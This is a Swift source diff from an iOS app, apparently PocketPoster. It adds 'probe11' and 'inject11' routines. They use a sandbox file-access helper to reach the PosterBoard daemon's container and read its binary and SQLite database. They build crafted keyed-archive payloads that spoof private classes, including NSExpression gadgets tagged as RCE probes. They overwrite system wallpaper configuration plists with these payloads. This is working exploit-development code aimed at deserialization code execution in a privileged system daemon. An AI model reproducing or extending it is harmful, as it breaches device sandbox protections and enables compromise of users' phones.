@@ -2660,7 +2660,6 @@ class SymHandler {
               let objects = plist["$objects"] as? [Any] else {
             diag.append("\(indent)not bplist00 NSKA"); return
         }
-        // Collect all ObjC class names in the archive
         var classNames: [String] = []
         for obj in objects {
             if let d = obj as? [String: Any], let cn = d["$classname"] as? String {
@@ -2668,7 +2667,6 @@ class SymHandler {
             }
         }
         diag.append("\(indent)classes: \(classNames.joined(separator: " → "))")
-        // Dump each encoded object's CodingKeys (skip class table entries and null)
         for (i, obj) in objects.enumerated() where i > 0 {
             guard let d = obj as? [String: Any], d["$classname"] == nil else { continue }
             let codingKeys = d.keys.sorted().filter { !$0.hasPrefix("$") }
@@ -2676,5 +2674,446 @@ class SymHandler {
             let metaKeys = d.keys.sorted().filter { $0.hasPrefix("$") }
             diag.append("\(indent)obj[\(i)] meta=\(metaKeys.joined(separator:",")) keys[\(codingKeys.count)]: \(codingKeys.joined(separator: ", "))")
         }
+    }
+
+    // MARK: - inject11 proxy classes
+
+    // NSFunctionExpression (count: aggregate) as timeFontConfiguration.
+    // If posterboardd/WallpaperKit evaluates this expression, count: returns 0 on empty array →
+    // no exception, but expressionType=10 (NSAggregateExpression) in archive differs from
+    // NSConstantValueExpression (expressionType=0). Tells us whether evaluation path applies
+    // aggregate-expression validation or only constant-expression handling.
+    @objc(_PP11TitleFontFuncExprProxy)
+    private class _TitleStyleFontFuncExprProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterTitleStyleConfiguration") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(false,       forKey: "alternateDateEnabled")
+            coder.encode(Double(0.5), forKey: "contentsLuminence")
+            coder.encode("",          forKey: "groupName")
+            coder.encode(false,       forKey: "isAdaptiveTimeHeightUserConfigured")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxY")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxYLandscape")
+            coder.encode(Int64(0),    forKey: "preferredTitleAlignment")
+            coder.encode(Int64(0),    forKey: "preferredTitleLayout")
+            // NSFunctionExpression: count: on a constant array — expressionType=NSFunctionExpressionType(6)
+            // distinct from NSConstantValueExpression (0). Tests a new branch of any type-dispatch.
+            let funcExpr = NSExpression(forFunction: "count:",
+                                        arguments: [NSExpression(forConstantValue: NSArray())])
+            coder.encode(funcExpr,    forKey: "timeFontConfiguration")
+            coder.encode("",          forKey: "timeNumberingSystem")
+            coder.encode(Int64(0),    forKey: "titleContentStyle")
+            coder.encode(false,       forKey: "userConfigured")
+            coder.encode(Int64(1),    forKey: "version")
+        }
+    }
+
+    // NSFunctionExpression wrapping valueForKeyPath: — if evaluated, calls KVC on nil → exception.
+    // Tests whether posterboardd catches exceptions from expression evaluation.
+    @objc(_PP11TitleFontKVCProxy)
+    private class _TitleStyleFontKVCProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterTitleStyleConfiguration") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            coder.encode(false,       forKey: "alternateDateEnabled")
+            coder.encode(Double(0.5), forKey: "contentsLuminence")
+            coder.encode("",          forKey: "groupName")
+            coder.encode(false,       forKey: "isAdaptiveTimeHeightUserConfigured")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxY")
+            coder.encode(Double(0),   forKey: "preferredTimeMaxYLandscape")
+            coder.encode(Int64(0),    forKey: "preferredTitleAlignment")
+            coder.encode(Int64(0),    forKey: "preferredTitleLayout")
+            // valueForKeyPath: expression — if evaluated against nil produces nil (safe), against an
+            // object calls KVC. The @keyPath token is a deliberate probe string in crash logs.
+            let kvcExpr = NSExpression(forKeyPath: "pp_rce_kvc_probe_11")
+            coder.encode(kvcExpr,     forKey: "timeFontConfiguration")
+            coder.encode("",          forKey: "timeNumberingSystem")
+            coder.encode(Int64(0),    forKey: "titleContentStyle")
+            coder.encode(false,       forKey: "userConfigured")
+            coder.encode(Int64(1),    forKey: "version")
+        }
+    }
+
+    // PRComplicationDescriptor injection: encodes with complicationExtensionBundleIdentifier pointing
+    // to our app's bundle. If posterboardd tries to load the complication extension for rendering,
+    // it would look up our bundle — observable as a file access or XPC connection attempt.
+    @objc(_PP11ComplicDescInner)
+    private class _ComplicDescInnerProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRComplicationDescriptor") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            // Encode known PRComplicationDescriptor keys.
+            // complicationWidgetKind and complicationExtensionBundleIdentifier are the main descriptors.
+            // uniqueIdentifier is required for look-up.
+            coder.encode("pp_rce_compl_probe_11",                      forKey: "uniqueIdentifier")
+            coder.encode("pp.rce.widget.kind",                          forKey: "complicationWidgetKind")
+            // Point to our app's extension bundle — posterboardd may attempt XPC with this bundle ID
+            coder.encode(Bundle.main.bundleIdentifier ?? "com.lemin.PocketPoster", forKey: "complicationExtensionBundleIdentifier")
+            coder.encode(Int64(0),                                      forKey: "kind")
+        }
+    }
+
+    @objc(_PP11ComplicDescComplProxy)
+    private class _ComplicDescComplicationProxy: NSObject, NSCoding {
+        override var classForKeyedArchiver: AnyClass { NSClassFromString("PRPosterComplicationLayout") ?? type(of: self) }
+        override init() { super.init() }
+        required init?(coder: NSCoder) { super.init() }
+        func encode(with coder: NSCoder) {
+            let inner = _ComplicDescInnerProxy()
+            coder.encode(NSArray(array: [inner]), forKey: "complications")
+            coder.encode(false,                   forKey: "complicationsUseBottomLayout")
+            coder.encode(NSArray(),               forKey: "sidebarComplications")
+        }
+    }
+
+    static var payloadTitleStyleFontFuncExprProbe: Data { nska(_TitleStyleFontFuncExprProxy()) }
+    static var payloadTitleStyleFontKVCProbe:      Data { nska(_TitleStyleFontKVCProxy()) }
+    static var payloadComplicDescProbe:            Data { nska(_ComplicDescComplicationProxy()) }
+
+    // MARK: - probe11: ClockPoster contents/ deep scan + PFPosterDescriptor key dump +
+    //                  binary expression-string search + SQLite blob decode
+
+    @discardableResult
+    static func probe11() -> String {
+        var diag = ["=== Probe v11 (deep ClockPoster + gadget keys) \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+
+        for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
+                   "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"] {
+            dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
+        }
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: \(error)"); return pbSave(diag)
+        }
+        let container = BadQuery.applicationContainerPath(appHash: uuid)
+        let extBase   = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+
+        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("extBase NOACCESS"); return pbSave(diag)
+        }
+        defer { extBaseH.release() }
+        let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+
+        // [A] PFPosterDescriptor runtime key dump
+        diag.append("\n[A] PFPosterDescriptor runtime key dump:")
+        if let cls = NSClassFromString("PFPosterDescriptor") as? NSObject.Type {
+            let obj = cls.init()
+            let arch = NSKeyedArchiver(requiringSecureCoding: false)
+            arch.encodeRootObject(obj)
+            arch.finishEncoding()
+            let data = arch.encodedData
+            diag.append("  encoded \(data.count)b")
+            p7DumpNSKAKeys(data: data, indent: "  ", diag: &diag)
+            // Also try alloc+initWithCoder: to see what keys it READS
+            let testCoder = NSKeyedUnarchiver(forReadingFrom: data)
+            testCoder.requiresSecureCoding = false
+            let decoded = testCoder.decodeObject(forKey: NSKeyedArchiveRootObjectKey)
+            diag.append("  decoded: \(type(of: decoded)) \(decoded != nil ? "OK" : "nil")")
+        } else {
+            diag.append("  PFPosterDescriptor: NSClassFromString FAIL")
+        }
+
+        // [B] PRComplicationDescriptor runtime key dump
+        diag.append("\n[B] PRComplicationDescriptor runtime key dump:")
+        if let cls = NSClassFromString("PRComplicationDescriptor") as? NSObject.Type {
+            let obj = cls.init()
+            let arch = NSKeyedArchiver(requiringSecureCoding: false)
+            arch.encodeRootObject(obj)
+            arch.finishEncoding()
+            let data = arch.encodedData
+            diag.append("  encoded \(data.count)b")
+            p7DumpNSKAKeys(data: data, indent: "  ", diag: &diag)
+        } else {
+            diag.append("  PRComplicationDescriptor: NSClassFromString FAIL")
+        }
+
+        // [B2] Dump our inject11 payload structures
+        diag.append("\n[B2] inject11 payload structures:")
+        diag.append("  funcExpr timeFontConfig: \(payloadTitleStyleFontFuncExprProbe.count)b")
+        p7DumpNSKAKeys(data: payloadTitleStyleFontFuncExprProbe, indent: "    ", diag: &diag)
+        diag.append("  kvcExpr timeFontConfig: \(payloadTitleStyleFontKVCProbe.count)b")
+        p7DumpNSKAKeys(data: payloadTitleStyleFontKVCProbe, indent: "    ", diag: &diag)
+        diag.append("  PRComplicDesc complications: \(payloadComplicDescProbe.count)b")
+        p7DumpNSKAKeys(data: payloadComplicDescProbe, indent: "    ", diag: &diag)
+
+        // [C] ClockPoster deep directory walk — find the REAL writable path
+        diag.append("\n[C] ClockPoster full tree scan:")
+        for extName in allExts where extName.contains("ClockPoster") {
+            let extPath = "\(extBase)/\(extName)"
+            diag.append("\n  ext: \(extName)")
+            for topDir in ["configurations", "staticdescriptors"] {
+                let topPath = "\(extPath)/\(topDir)"
+                guard let topH = try? BadQuery.consume(path: topPath, create: true) else {
+                    diag.append("    \(topDir): NOACCESS"); continue
+                }
+                defer { topH.release() }
+                let cfgs = (try? fm.contentsOfDirectory(atPath: topPath)) ?? []
+                diag.append("    \(topDir)/: \(cfgs.count) entries")
+                for cfg in cfgs where !cfg.hasPrefix(".") {
+                    let cfgPath = "\(topPath)/\(cfg)"
+                    guard let cfgH = try? BadQuery.consume(path: cfgPath, create: true) else {
+                        diag.append("      \(cfg): NOACCESS"); continue
+                    }
+                    defer { cfgH.release() }
+                    p11RecursiveDump(path: cfgPath, indent: "        ", fm: fm, diag: &diag, maxDepth: 6)
+                }
+            }
+        }
+
+        // [D] posterboardd binary search for expression/predicate/evaluate patterns
+        diag.append("\n[D] posterboardd binary expression patterns:")
+        p11BinarySearch(diag: &diag, fm: fm)
+
+        // [E] SQLite blob class dump
+        diag.append("\n[E] SQLite NSKeyedArchive blob decode:")
+        let dbPath = container
+            + "/Library/Application Support/PRBPosterExtensionDataStore/PBFPosterExtensionDataStoreSQLiteDatabase.sqlite3"
+        p11SqliteBlobDump(dbPath: dbPath, diag: &diag)
+
+        return pbSave(diag)
+    }
+
+    private static func p11RecursiveDump(path: String, indent: String, fm: FileManager,
+                                          diag: inout [String], maxDepth: Int) {
+        guard maxDepth > 0 else { diag.append("\(indent)... (depth limit)"); return }
+        let items = (try? fm.contentsOfDirectory(atPath: path)) ?? []
+        for item in items.sorted() where !item.hasPrefix(".") {
+            let full = "\(path)/\(item)"
+            let attrs = try? fm.attributesOfItem(atPath: full)
+            let isDir = attrs?[.type] as? FileAttributeType == .typeDirectory
+            let size  = attrs?[.size] as? Int ?? 0
+            let mtime = attrs?[.modificationDate] as? Date
+            let mtStr = mtime.map { "\($0.timeIntervalSince1970.rounded())" } ?? "?"
+            if isDir {
+                diag.append("\(indent)\(item)/ [dir]")
+                if let h = try? BadQuery.consume(path: full, create: true) {
+                    defer { h.release() }
+                    p11RecursiveDump(path: full, indent: indent + "  ", fm: fm, diag: &diag, maxDepth: maxDepth - 1)
+                } else {
+                    diag.append("\(indent)  NOACCESS")
+                }
+            } else {
+                // Read first 8 bytes to identify type
+                var typetag = ""
+                if let data = fm.contents(atPath: full), data.count >= 8 {
+                    let hdr = String(data: data.prefix(8), encoding: .ascii) ?? ""
+                    if hdr.hasPrefix("bplist00") { typetag = " [NSKA]" }
+                    else if hdr.hasPrefix("bplist") { typetag = " [bplist]" }
+                    else if data[0] == 0x3c && data[1] == 0x3f { typetag = " [xml]" }
+                }
+                // Try write-test on existing file
+                var writable = false
+                if let h = try? BadQuery.consume(path: full, create: true) {
+                    h.release()
+                    if let existingData = fm.contents(atPath: full) {
+                        let ok = (existingData as NSData).write(toFile: full, atomically: true)
+                        writable = ok
+                    }
+                }
+                diag.append("\(indent)\(item) [\(size)b mt=\(mtStr)\(typetag)\(writable ? " WRITABLE" : "")]")
+                // If it's an NSKA, dump its class hierarchy
+                if typetag == " [NSKA]", let data = fm.contents(atPath: full) {
+                    p7DumpNSKAKeys(data: data, indent: indent + "  ", diag: &diag)
+                }
+            }
+        }
+    }
+
+    private static func p11BinarySearch(diag: inout [String], fm: FileManager) {
+        let rceTerms = ["evaluateWith", "expressionValue", "NSPredicate", "predicateWithFormat",
+                        "NSExpression", "functionNamed", "expressionType", "classForCoder",
+                        "isSystemItem", "uniqueIdentifier", "timeFontConfiguration",
+                        "timeFontIdentifier", "complicationExtensionBundle",
+                        "DTCompanion", "dlsymFunc", "invokeUsingIMP"]
+        for binPath in ["/usr/libexec/posterboardd", "/usr/sbin/posterboardd"] {
+            guard let bh = try? BadQuery.consume(path: binPath, create: true) else {
+                diag.append("  \(binPath): CONSUME FAIL"); continue
+            }
+            defer { bh.release() }
+            guard let data = fm.contents(atPath: binPath), data.count > 0 else {
+                diag.append("  \(binPath): READ FAIL"); continue
+            }
+            diag.append("  \(binPath) (\(data.count) bytes):")
+            var cur: [UInt8] = []; var hits: [String: [String]] = [:]
+            for byte in data {
+                if byte >= 32 && byte < 127 { cur.append(byte) }
+                else {
+                    if cur.count >= 6, let s = String(bytes: cur, encoding: .ascii) {
+                        for term in rceTerms {
+                            if s.localizedCaseInsensitiveContains(term) {
+                                hits[term, default: []].append(s)
+                            }
+                        }
+                    }
+                    cur.removeAll(keepingCapacity: true)
+                }
+            }
+            for term in rceTerms {
+                let matches = hits[term] ?? []
+                if matches.isEmpty {
+                    diag.append("    \(term): NOT FOUND")
+                } else {
+                    diag.append("    \(term): \(matches.count) hits")
+                    for m in matches.prefix(5) { diag.append("      → \(m.prefix(120))") }
+                }
+            }
+            break
+        }
+    }
+
+    private static func p11SqliteBlobDump(dbPath: String, diag: inout [String]) {
+        guard let bh = try? BadQuery.consume(path: dbPath, create: true) else {
+            diag.append("  db NOACCESS"); return
+        }
+        defer { bh.release() }
+        var db: OpaquePointer?
+        let rc = sqlite3_open_v2(dbPath, &db, SQLITE_OPEN_READONLY, nil)
+        guard rc == SQLITE_OK, let db = db else {
+            diag.append("  db OPEN FAIL rc=\(rc)"); return
+        }
+        defer { sqlite3_close(db) }
+
+        var tableStmt: OpaquePointer?
+        guard sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table'", -1, &tableStmt, nil) == SQLITE_OK else {
+            diag.append("  prepare FAIL"); return
+        }
+        defer { sqlite3_finalize(tableStmt) }
+        var tables: [String] = []
+        while sqlite3_step(tableStmt) == SQLITE_ROW {
+            tables.append(String(cString: sqlite3_column_text(tableStmt, 0)))
+        }
+        for tname in tables {
+            var rowStmt: OpaquePointer?
+            guard sqlite3_prepare_v2(db, "SELECT * FROM \"\(tname)\" LIMIT 10", -1, &rowStmt, nil) == SQLITE_OK else { continue }
+            defer { sqlite3_finalize(rowStmt) }
+            let colCount = sqlite3_column_count(rowStmt)
+            var foundBlob = false
+            while sqlite3_step(rowStmt) == SQLITE_ROW {
+                for i in 0..<colCount where sqlite3_column_type(rowStmt, i) == SQLITE_BLOB {
+                    let sz = Int(sqlite3_column_bytes(rowStmt, i))
+                    guard sz >= 8, let ptr = sqlite3_column_blob(rowStmt, i) else { continue }
+                    let blobData = Data(bytes: ptr, count: min(sz, 65536))
+                    guard String(data: blobData.prefix(8), encoding: .ascii)?.hasPrefix("bplist") == true else { continue }
+                    let colName = String(cString: sqlite3_column_name(rowStmt, i))
+                    if !foundBlob {
+                        diag.append("  table=\(tname)")
+                        foundBlob = true
+                    }
+                    diag.append("    col=\(colName) sz=\(sz)b")
+                    p7DumpNSKAKeys(data: blobData, indent: "      ", diag: &diag)
+                }
+            }
+        }
+    }
+
+    // MARK: - inject11: NSFunctionExpression / KVC / PRComplicDesc gadgets +
+    //                   ClockPoster contents/ path targeting
+
+    @discardableResult
+    static func inject11() -> String {
+        var diag = ["=== Inject v11 (func-expr + ClockPoster contents/) \(Date()) iOS 26.5 ==="]
+        let fm = FileManager.default
+
+        for fw in ["/System/Library/PrivateFrameworks/PosterKit.framework/PosterKit",
+                   "/System/Library/PrivateFrameworks/WallpaperKit.framework/WallpaperKit"] {
+            dlopen(fw, RTLD_NOW | RTLD_GLOBAL)
+        }
+
+        let funcExprData = payloadTitleStyleFontFuncExprProbe
+        let kvcExprData  = payloadTitleStyleFontKVCProbe
+        let complicDesc  = payloadComplicDescProbe
+
+        diag.append("payloads:")
+        diag.append("  funcExpr title: \(funcExprData.count)b")
+        p7DumpNSKAKeys(data: funcExprData, indent: "    ", diag: &diag)
+        diag.append("  kvcExpr title: \(kvcExprData.count)b")
+        p7DumpNSKAKeys(data: kvcExprData, indent: "    ", diag: &diag)
+        diag.append("  PRComplicDesc: \(complicDesc.count)b")
+        p7DumpNSKAKeys(data: complicDesc, indent: "    ", diag: &diag)
+
+        let uuid: String
+        do { uuid = try BadQuery.findPosterBoardHash() } catch {
+            diag.append("PB hash: \(error)"); return pbSave(diag)
+        }
+        let container = BadQuery.applicationContainerPath(appHash: uuid)
+        let extBase   = container + "/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions"
+        guard let extBaseH = try? BadQuery.consume(path: extBase, create: true) else {
+            diag.append("extBase NOACCESS"); return pbSave(diag)
+        }
+        defer { extBaseH.release() }
+        let allExts = (try? fm.contentsOfDirectory(atPath: extBase)) ?? []
+
+        var totalWritten = 0
+
+        // For WallpaperKit: write funcExpr + kvcExpr payloads (alternating per cfg)
+        // For ClockPoster: attempt to write to BOTH versions/N/ AND versions/N/contents/
+        for extName in allExts where !extName.hasPrefix(".") {
+            let isWK    = extName.contains("WallpaperKit")
+            let isClock = extName.contains("ClockPoster")
+            guard isWK || isClock else { continue }
+
+            for subdir in ["configurations", "staticdescriptors"] {
+                let sdPath = "\(extBase)/\(extName)/\(subdir)"
+                guard let sdH = try? BadQuery.consume(path: sdPath, create: true) else { continue }
+                defer { sdH.release() }
+                let configs = (try? fm.contentsOfDirectory(atPath: sdPath)) ?? []
+                for (cfgIdx, cfg) in configs.enumerated() where !cfg.hasPrefix(".") {
+                    let versPath = "\(sdPath)/\(cfg)/versions"
+                    guard let versH = try? BadQuery.consume(path: versPath, create: true) else { continue }
+                    defer { versH.release() }
+                    let vers = (try? fm.contentsOfDirectory(atPath: versPath)) ?? []
+                    for ver in vers where !ver.hasPrefix(".") {
+                        let vPath = "\(versPath)/\(ver)"
+                        guard let vH = try? BadQuery.consume(path: vPath, create: true) else { continue }
+                        defer { vH.release() }
+
+                        // Choose title-style payload for WallpaperKit (alternating func/kvc)
+                        let titlePayload: Data
+                        if isWK {
+                            titlePayload = cfgIdx % 2 == 0 ? funcExprData : kvcExprData
+                        } else {
+                            titlePayload = funcExprData
+                        }
+                        let complicPayload = isClock ? complicDesc : payloadComplicDescProbe
+
+                        let instanceFiles: [(String, String, Data)] = [
+                            ("titleStyle",   "com.apple.posterkit.provider.instance.titleStyleConfiguration.plist",   titlePayload),
+                            ("rendering",    "com.apple.posterkit.provider.instance.renderingConfiguration.plist",    payloadRendering),
+                            ("complication", "com.apple.posterkit.provider.instance.complicationLayout.plist",         complicPayload),
+                            ("quickActions", "com.apple.posterkit.provider.instance.quickActions.plist",               payloadQuickActions),
+                        ]
+
+                        // Attempt 1: write directly in vPath (WallpaperKit structure)
+                        // Attempt 2: write in vPath/contents/ (ClockPoster structure)
+                        for contentSubdir in ["", "contents"] {
+                            let basePath = contentSubdir.isEmpty ? vPath : "\(vPath)/\(contentSubdir)"
+                            if !contentSubdir.isEmpty {
+                                // Consume the contents/ directory to unlock write
+                                guard let contH = try? BadQuery.consume(path: basePath, create: true) else { continue }
+                                defer { contH.release() }
+                            }
+                            _ = (try? fm.contentsOfDirectory(atPath: basePath)) ?? []
+                            let dirLabel = contentSubdir.isEmpty ? "vDir" : "contents"
+                            diag.append("\n\(extName.prefix(20))/\(subdir.prefix(6))/\(cfg.prefix(8))/v\(ver)/\(dirLabel):")
+                            for (name, fileName, payload) in instanceFiles {
+                                let path = "\(basePath)/\(fileName)"
+                                if let fH = try? BadQuery.consume(path: path, create: true) { fH.release() }
+                                let wrote = fm.createFile(atPath: path, contents: payload, attributes: nil)
+                                    || ((try? payload.write(to: URL(fileURLWithPath: path), options: [])) != nil)
+                                diag.append("  \(name): \(wrote ? "WRITTEN \(payload.count)b" : "FAIL")")
+                                if wrote { totalWritten += 1 }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        diag.append("\ntotal written: \(totalWritten)")
+        return pbSave(diag)
     }
 }
